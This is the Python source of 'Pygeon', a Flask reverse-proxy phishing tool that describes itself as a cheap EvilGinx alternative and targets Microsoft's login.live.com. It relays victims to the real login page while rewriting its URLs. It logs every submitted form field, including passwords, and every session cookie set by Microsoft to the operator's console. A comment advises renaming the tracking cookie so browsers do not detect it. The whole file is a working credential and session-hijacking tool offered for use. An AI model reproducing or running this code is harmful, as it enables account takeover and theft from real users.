# pip install Flask
# pip install requests
# pip install beautifulsoup4
# pip install colorama

import requests
import urllib3
import os
import re
import logging
import art
from flask import Flask, request, Response, make_response
from urllib.parse import urlparse
from datetime import datetime, timedelta
from colorama import Fore, Style, init
from threading import Lock
import uuid

# Constants
FINAL_ENDPOINT = "https://login.live.com"
REVERSE_PROXY_URL = "http://127.0.0.1:8887"
URL_REPLACEMENT_REGEX = r'https://(login\.)?live\.com'
PROXY_COOKIE_NAME = "PIGE_ID"
# Change PROXY_COOKIE_NAME on production since browsers will start to detect it (Use something related to the target domain's cookies)

# Parse REVERSE_PROXY_URL for the Referer replacement
reverse_proxy_parsed = urlparse(REVERSE_PROXY_URL)
reverse_proxy_netloc = reverse_proxy_parsed.netloc
reverse_proxy_scheme = reverse_proxy_parsed.scheme

# Suppress warnings from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Suppress Flask's default request log
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Initialize colorama and Lock
init()
print_lock = Lock()

def set_or_get_user_cookie():
    user_id = request.cookies.get(PROXY_COOKIE_NAME)
    if not user_id:
        user_id = str(uuid.uuid4())
    return user_id

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    user_id = set_or_get_user_cookie()
    
    _, ext = os.path.splitext(path)
    
    url = f"{FINAL_ENDPOINT}/{path}"
    headers = {'User-Agent': request.headers.get('User-Agent', '')}
    
    referer = request.headers.get('Referer', '')
    if reverse_proxy_netloc in referer:
        headers['Referer'] = referer.replace(REVERSE_PROXY_URL, FINAL_ENDPOINT)

    if request.method == 'POST':
        resp = requests.post(url, headers=headers, data=request.form, verify=False)
        if len(request.form) > 0:
            with print_lock:
                print(f"{Fore.BLUE}{user_id} - {get_timestamp()} => {Fore.GREEN}Form data from POST request:{Style.RESET_ALL}")
                for key, value in request.form.items():
                    print(f"{Fore.BLUE}{user_id} - {get_timestamp()} => {Fore.YELLOW}{key}: {value}{Style.RESET_ALL}")
                print()  # New empty line after form data
    else:
        resp = requests.get(url, headers=headers, verify=False)

    content_type = resp.headers.get('Content-Type', 'text/plain')
    charset_match = re.search(r'charset=([\w-]+)', content_type)
    charset = charset_match.group(1) if charset_match else 'utf-8'

    try:
        if any(subtype in content_type for subtype in ['text/', 'application/javascript', 'application/json']):
            decoded_content = resp.content.decode(charset)
            modified_content = re.sub(URL_REPLACEMENT_REGEX, REVERSE_PROXY_URL, decoded_content)
            resp_flask = make_response(modified_content.encode(charset))
            resp_flask.headers.set('Content-Type', content_type)
            
            if 'Set-Cookie' in resp.headers:
                with print_lock:
                    print(f"{Fore.BLUE}{user_id} - {get_timestamp()} => {Fore.GREEN}Cookie Set or Changed by Remote Host:{Style.RESET_ALL} {Fore.MAGENTA}{resp.headers['Set-Cookie']}{Style.RESET_ALL}")
                    print()  # New empty line after cookie data

            if not request.cookies.get(PROXY_COOKIE_NAME):
                expire_date = datetime.now()
                expire_date = expire_date + timedelta(days=3650)  # 10 years from now
                resp_flask.set_cookie(PROXY_COOKIE_NAME, user_id, expires=expire_date)
                
            return resp_flask
        else:
            return Response(resp.content, content_type=content_type)
    except UnicodeDecodeError:
        with print_lock:
            print(f"{Fore.RED}UnicodeDecodeError occurred. Sending the response as-is. Charset: {charset}{Style.RESET_ALL}")
        return Response(resp.content, content_type=content_type)

# Get the current timestamp for the prints
def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def display_author_and_art():
    ascii_art = art.text2art("Pygeon")
    with print_lock:
        print(f"{Fore.GREEN}{ascii_art}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{get_timestamp()} - {Fore.CYAN}[INF] A cheap alternative to EvilGinx{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{get_timestamp()} - {Fore.CYAN}[INF] Author: Konstantinos Karakatsoulis - Proud author of Lecpetex{Style.RESET_ALL}")
        print()

if __name__ == '__main__':
    display_author_and_art()
    app.run(host='0.0.0.0', port=8887)
